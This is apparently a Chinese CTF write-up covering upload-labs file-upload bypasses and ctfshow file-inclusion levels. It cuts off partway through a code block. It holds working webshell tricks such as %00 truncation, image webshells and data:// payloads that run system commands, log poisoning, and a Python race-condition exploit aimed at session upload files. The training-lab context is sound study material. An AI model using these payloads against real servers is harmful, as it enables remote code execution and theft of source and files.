禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件</p><p>但是<code>$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; </code>，路径拼接的是<strong>处理后的文件名</strong>，于是构造info.php. . （点+空格+点），经过处理后，文件名变成info.php.，即可绕过</p><p>​         </p><p><strong>10关</strong></p><p>只允许上传.jpg|.png|.gif后缀的文件！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);将黑名单后缀名替换为空</span><br><span class="line">    </span><br><span class="line">解释</span><br><span class="line">str_ireplace(find,replace,<span class="keyword">string</span>,count)</span><br><span class="line">参数  描述</span><br><span class="line">find    必需。规定要查找的值。</span><br><span class="line">replace 必需。规定替换 find 中的值的值。</span><br><span class="line"><span class="keyword">string</span>  必需。规定被搜索的字符串。</span><br><span class="line">count   可选。一个变量，对替换数进行计数</span><br></pre></td></tr></table></figure><p>绕过，大小写失败，双写绕过成功</p><p>​        </p><p><strong>11关</strong></p><p>白名单  $_GET传参save_path</p><p>会从文件名中去除.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess字符！</p><p>$img_path直接拼接，因此可以利用**%00截断**绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">strrpos() 定义和用法 </span><br><span class="line">strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。 注释：strrpos() 函数对大小写敏感。 </span><br><span class="line">相关函数： </span><br><span class="line">stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写） </span><br><span class="line">strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写） </span><br><span class="line">strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写） </span><br><span class="line">语法 </span><br><span class="line">strrpos(<span class="keyword">string</span>,find,start) </span><br><span class="line">参数 描述 </span><br><span class="line"><span class="keyword">string</span> 必需。规定被搜索的字符串。 </span><br><span class="line">find 必需。规定要查找的字符。 </span><br><span class="line">start 可选。规定在何处开始搜索。</span><br><span class="line">    </span><br><span class="line">substr() 这里写代码片语法 </span><br><span class="line">substr(<span class="keyword">string</span>,start,length) </span><br><span class="line">参数 描述 </span><br><span class="line"><span class="keyword">string</span> 必需。规定要返回其中一部分的字符串。 </span><br><span class="line">start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始 负数 - 在从字符串结尾开始的指定位置开始<span class="number">0</span> - 在字符串中的第一个字符处开始 length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">截断条件：</span><br><span class="line">    php版本小于<span class="number">5.3</span>.<span class="number">4</span> 详情关注CVE-<span class="number">2006</span>-<span class="number">7243</span></span><br><span class="line">    php的参数开关上设置里magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure><p>在请求头 sava_path=../upload/a.php%00 截断，上传</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/9.jpg"></p><p>​        </p><p><strong>12关</strong></p><p>白名单  $_POST传参save_path</p><p>还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/10.jpg">    </p><p>添加一个1.php+(任意名称)</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/11.jpg">    </p><p>2b代表二进制这里的2b对应的就是**+**号，将2b改成00，即可成功截断，1.php也可成功上传利用</p><p>​        </p><p><strong>13关</strong></p><p>本pass上传路径可控<br>图片马<br>验证上传文件类型的方法是：通过判断上传文件的前两个字节来判断的，所以直接上传图片马即可绕过.jpg和.png检查，制作方法<br>copy 1.jpg /b + info.php /a shell.jpg<br>1.jpg是一个图片，info.php写入一句话木马的文件，shell.jpg复制后的文件<br>使用文件包含漏洞，读取上传的文件<br>可以写一个include.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传文件后查看返回包，获取文件绝对路径</p><p>访问：<code>http://127.0.0.1/upload-labs-master/upload/include.php?page=upload/a.jpg</code>解析</p><p>​         </p><p><strong>14关</strong></p><p>这里使用<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/Q%E6%88%AA%E5%9B%BE12.png">getimagesize获取文件类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。</span><br><span class="line"></span><br><span class="line">如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 </span><br></pre></td></tr></table></figure><p>利用图片马就可进行绕过，和上一关一样</p><p>​        </p><p><strong>15关</strong></p><p>利用exif_imagetype()，判断文件类型，Pass-13的方法即可绕过</p><p>​          </p><p><strong>16关</strong></p><p>使用imagecreatefromjpeg()来判断文件类别，已可以使用 Pass-13 的方法。</p><p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的</p><p>​        </p><p><strong>17关</strong>文件异常</p><p>​      </p><p><strong>18关</strong></p><p>像Pass-13一样可以上传图片马</p><p>​      </p><p><strong>19关</strong>文件异常</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>通过<code>PHP</code>函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，导致意外的文件泄漏甚至恶意代码注入。</p><p>以下服务器位于 Linux 下</p><p><strong>1关</strong></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>data协议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,xxxx(要执行的php代码)</span><br><span class="line">data://text/plain;base64,xxxx(base64编码后的数据)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">data协议 php5.2.0起，数据流封装器开始有效</span><br><span class="line">data伪协议的一些格式：</span><br><span class="line"></span><br><span class="line">      data://,&lt;文本数据&gt;</span><br><span class="line"></span><br><span class="line">      data://text/plain,&lt;文本数据&gt;</span><br><span class="line"></span><br><span class="line">      data://text/html,&lt;html代码&gt;</span><br><span class="line"></span><br><span class="line">      data://text/css,&lt;CSS代码&gt;</span><br><span class="line"></span><br><span class="line">      data://text/javascript,&lt;js代码&gt;</span><br><span class="line"></span><br><span class="line">      data://text/gif;base64,&lt;base64编码的gif图片数据&gt;</span><br></pre></td></tr></table></figure><p>使用 data 协议查询文件</p><p>data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p><p>之后尝试使用 data 协议执行 cat 命令，失败了。改用 php:// 协议的 filter 类型 </p><p><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code>，结果进行 base64 解码，出 flag</p><p>​      </p><p><strong>2关</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">将代码中的 php 用 ??? 替代</span><br></pre></td></tr></table></figure><p>所以我们使用 data  协议的时候进行 base64 一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4= //查询</span></span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==  //（<span class="meta">&lt;?php</span> system(&#x27;cat flag.php&#x27;);<span class="meta">?&gt;</span>）</span></span><br></pre></td></tr></table></figure><p>​      </p><p><strong>3关</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);<span class="comment">//替代，使用base64</span></span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);<span class="comment">//替代，data不能用了</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用日志 getshell ,文件包含日志 <code>?file=/var/log/nginx/access.log</code>，抓这个包，然后将User-Agent 改成一句话木马，放包。</p><p>蚁剑 连接<code>http://xxx?file=/var/log/nginx/access.log</code>,输入密码连接，找到flag</p><p>​       </p><p><strong>4关</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);<span class="comment">//替换</span></span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);<span class="comment">//替换</span></span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);<span class="comment">//替换</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解法和3关一样</p><p>​       </p><p><strong>5关</strong></p><p><strong>5~9过滤严重，都要利用 session 文件，利用session.upload_progress进行文件包含</strong></p><p>此特性在 PHP5.4版本 及 以上 可用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到，题目过滤了<code>.</code>,只能找一个不带<code>.</code>路径的文件,所以选择了 session 会话文件</p><p>介绍：</p><p>session是以文件的形式保存的<br>php.ini中有个配置项–session.save_path= “”;这个里面填写的路径，将会使session文件保存在该路径下。</p><p>session文件的命名格式是：sess_[PHPSESSID的值]。每一个文件，里面保存了一个会话的数据。其实只要使用代码$_SESSION[‘user_id’] = $value;就会促发php的session机制，结果往对应的session文件中写入一个值。<br>利用前要弄明白下面几个点:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">1.session文件默认路径</span><br><span class="line">默认路径:</span><br><span class="line">linux: /tmp 或 /var/lib/php/session</span><br><span class="line">Windows：C:\WINDOWS\Temp</span><br><span class="line"></span><br><span class="line">2.session文件名称</span><br><span class="line">默认文件名称是 sess_[PHPSESSID的值]</span><br><span class="line">ps: session.use_strict_mode默认值为0, 此时用户是可以自己定义Session ID</span><br><span class="line">比如，我们在Cookie里设置PHPSESSID=test，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO</span><br><span class="line"></span><br><span class="line">3.session生成机制:</span><br><span class="line">a. 代码里面有session_start()在使用类似$_SESSION[&#x27;user_id&#x27;] = $value;这样的操作时会创建session文件</span><br><span class="line">b. 如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start(),但默认情况下，这个选项都是关闭的。</span><br><span class="line"></span><br><span class="line">4.如何控制session文件内容</span><br><span class="line">a. session的key或者value等可控</span><br><span class="line">b.利用session.upload_progress</span><br><span class="line">在session.upload_progress.enabled = on的配置下,upload_progress功能开始.意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度,上传文件名等)存储在session当中 ,但是要注意session.upload_progress.cleanup = on配置,on表示当文件上传结束后，php将会立即清空对应session文件中的内容(可以利用条件竞争来读取)</span><br><span class="line">session.uoload_progress一些别的配置:</span><br><span class="line">session.upload_progress.prefix 默认值为upload_progress_</span><br><span class="line">session.upload_progress.name : The name of the key to be used in $_SESSION storing the progress information.Defaults to “PHP_SESSION_UPLOAD_PROGRESS”</span><br><span class="line">如 session.upload_progress.prefix = &#x27;upload_progress_&#x27; session.upload_progress.name=&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;的条件下,上传文件:</span><br><span class="line"></span><br><span class="line">// PHPSESSION = test</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">就会在session的session[‘upload_progress_123’]中储存一些本次上传相关的信息,储存在/tmp/sess_test</span><br></pre></td></tr></table></figure><p>使用这个脚本，基本都可以利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @author:lonmar</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://9449993b-3df1-4b4a-a8e9-7e20f9155dc4.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#x27;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url + <span class="string">&#x27;?file=/tmp/sess_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(sessID))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]retrying...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure><p>​      </p><p><strong>6关</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">源码</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        </p><p><strong>7关</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>​        </p><p><strong>8关</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span 